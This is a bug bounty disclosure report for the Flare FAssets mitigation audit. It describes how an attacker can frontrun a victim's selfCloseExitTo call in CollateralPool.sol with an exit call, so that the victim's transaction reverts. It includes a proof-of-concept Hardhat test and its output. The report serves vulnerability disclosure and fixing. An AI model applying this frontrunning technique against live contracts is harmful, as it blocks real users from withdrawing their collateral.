# #55242 \[SC-Low] selfcloseexitto vulnerable to frontrunning griefing via exit&#x20;

**Submitted on Sep 25th 2025 at 08:57:22 UTC by @Pig46940** **for** [**Mitigation Audit | Flare | FAssets**](https://immunefi.com/audit-competition/flare-fassets--mitigation-audit)

* Report ID: #55242
* Report Type: Smart Contract
* Severity: Low
* Target commit: <https://github.com/flare-foundation/fassets/commit/7dd1ddd574989c44b3057ce426ff188bc69743d1>
* Impacts:
  * Griefing (no profit motive for attacker, but damage to users or protocol)
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief / Intro

The refactored `selfCloseExitTo` function in `CollateralPool.sol` is vulnerable to a griefing attack where an attacker frontruns a victim’s self-close exit by calling `exit` to reduce pool collateral. This manipulation raises the required fAsset amount for the victim’s `selfCloseExitTo` call, causing the victim’s transaction to revert due to insufficient allowance.

### Vulnerability details

`selfCloseExitTo` computes a required f-asset amount using the current `totalCollateral` and then checks:

```solidity
uint256 requiredFAssets = _getFAssetRequiredToNotSpoilCR(natShare);
...
require(fAsset.allowance(msg.sender, address(this)) >= requiredFAssets, FAssetAllowanceTooSmall());
fAsset.safeTransferFrom(msg.sender, address(this), requiredFAssets);
```

Because `requiredFAssets` depends on `totalCollateral`, which is mutable and can be decreased by other users’ `exit` calls, the computed `requiredFAssets` can increase between the time the victim reads it off-chain and approves that amount, and the time their `selfCloseExitTo` transaction executes. An attacker can frontrun by calling `exit` first (reducing `totalCollateral`), increasing `requiredFAssets`, causing the victim’s transaction to revert at the allowance check.

#### Two code branches in `_getFAssetRequiredToNotSpoilCR`

{% stepper %}
{% step %}

### Pool is above `exitCR`

Code excerpt:

```solidity
// f-asset required for CR to stay above exitCR (might not be needed)
// solve (N - n) / (p / q (F - f)) >= cr get f = max(0, F - q (N - n) / (p cr))
resultWithoutRounding = MathUtils.subOrZero(backedFAssets,
    assetPrice.div * (totalCollateral - _natShare) * SafePct.MAX_BIPS / (assetPrice.mul * exitCR));
```

Behavior: decreasing `totalCollateral` (N) decreases the subtracted term → increases `resultWithoutRounding` → increases `requiredFAssets`. Thus an attacker withdrawing collateral increases the f-asset requirement for a pending self-close exit.
{% endstep %}

{% step %}

### Pool at or below `exitCR`

Code excerpt:

```solidity
// f-asset that preserves pool CR (assume poolNatBalance >= natShare > 0)
// solve (N - n) / (F - f) = N / F get f = n F / N
resultWithoutRounding = backedFAssets.mulDivRoundUp(_natShare, totalCollateral);
```

Behavior: decreasing `totalCollateral` (N) makes the fraction `natShare / totalCollateral` larger → increases required f-assets as well. Again, an attacker reducing total collateral raises the requirement for the same `natShare`.
{% endstep %}
{% endstepper %}

### Attack flow

1. Victim deposits into the pool and obtains pool tokens (`tokenBalance`).
2. Off-chain, the victim computes `initialRequired = collateralPool.fAssetRequiredForSelfCloseExit(tokenBalance)` and approves `initialRequired` to `collateralPool`.
3. Attacker observes the mempool and frontruns the victim by calling `collateralPool.exit(attackerTokens)`, reducing `totalCollateral`.
4. The victim’s approved allowance is now too small relative to the new `requiredFAssets` computed at execution time.
5. The victim’s `selfCloseExitTo` transaction reverts at the allowance check:

```
require(fAsset.allowance(msg.sender, address(this)) >= requiredFAssets, FAssetAllowanceTooSmall());
```

revert reason: `FAssetAllowanceTooSmall`

## Impact details

* Denial of exit — Victim’s transaction reverts due to insufficient allowance, preventing them from closing their position and retrieving collateral.
* Temporary fund lock — Victim’s funds are effectively locked in the pool until they recompute and approve a higher fAsset amount.
* Repeated exploitation — An attacker could repeatedly frontrun multiple victims, causing widespread griefing and user frustration.
* Operational disruption — Users may be forced to over-approve fAssets to avoid reverts, increasing exposure.

## Proof of Concept

This PoC demonstrates how an attacker can block a victim’s `selfCloseExit` by manipulating the pool’s collateral ratio (CR). Add the following test to `CollateralPool.ts`:

```solidity
it.only("should demonstrate griefing: attacker raises CR via exit and blocks victim's selfCloseExit", async () => {
    const victim = accounts[0];
    const attacker = accounts[1];

    await collateralPool.enter({ value: ETH(10), from: victim });
    await collateralPool.enter({ value: ETH(1), from: attacker });

    await fAsset.mint(victim, ETH(100), { from: assetManager.address });
    await fAsset.mint(attacker, ETH(1), { from: assetManager.address });

    await assetManager.setFAssetsBackedByPool(ETH(10));

    await fAsset.mint(collateralPool.address, ETH(100), { from: assetManager.address });
    const payload = abiEncodeCall(collateralPool, (p) => p.fAssetFeeDeposited(ETH(100)));
    await assetManager.callFunctionAt(collateralPool.address, payload);

    // Victim’s token balance and initial requirement
    const victimTokens = await collateralPoolToken.balanceOf(victim);
    const initialRequired = await collateralPool.fAssetRequiredForSelfCloseExit(victimTokens);
    await fAsset.approve(collateralPool.address, initialRequired, { from: victim });
    console.log("Initial required FAssets for victim exit:", initialRequired.toString());

    // Attacker frontruns by manipulating CR through exit (griefing action)
    const attackerTokens = await collateralPoolToken.balanceOf(attacker);
    await collateralPool.exit(attackerTokens, { from: attacker });

    // Victim’s new requirement after attacker manipulation
    const newRequired = await collateralPool.fAssetRequiredForSelfCloseExit(victimTokens);
    console.log("New required FAssets after attacker manipulation:", newRequired.toString());

    // Victim’s selfCloseExit is now blocked due to increased requirement
    await expectRevert.custom(
        collateralPool.selfCloseExit(victimTokens, true, "", ZERO_ADDRESS, { from: victim }),
        "FAssetAllowanceTooSmall",
        []
    );
});
```

Run the test:

```bash
$ yarn hardhat test ./test/unit/collateralPool/CollateralPool.ts
yarn run v1.22.22

  Contract: CollateralPool.sol; test/unit/collateralPool/CollateralPool.ts; Collateral pool basic tests
    Testing the original stuck funds bug and its fix
Initial required FAssets for victim exit: 8333333334000000000
New required FAssets after attacker manipulation: 10000000000000000000
      ✔ should demonstrate griefing: attacker raises CR via exit and blocks victim's selfCloseExit (48ms)


  1 passing (934ms)
```

## References

* Refactored: CollateralPool.sol (Commit 55db6c7)
  * <https://github.com/flare-foundation/fassets/blob/main/contracts/collateralPool/implementation/CollateralPool.sol>
* Test: CollateralPool.ts (Commit 55db6c7)
  * <https://github.com/flare-foundation/fassets/blob/main/test/unit/collateralPool/CollateralPool.ts>
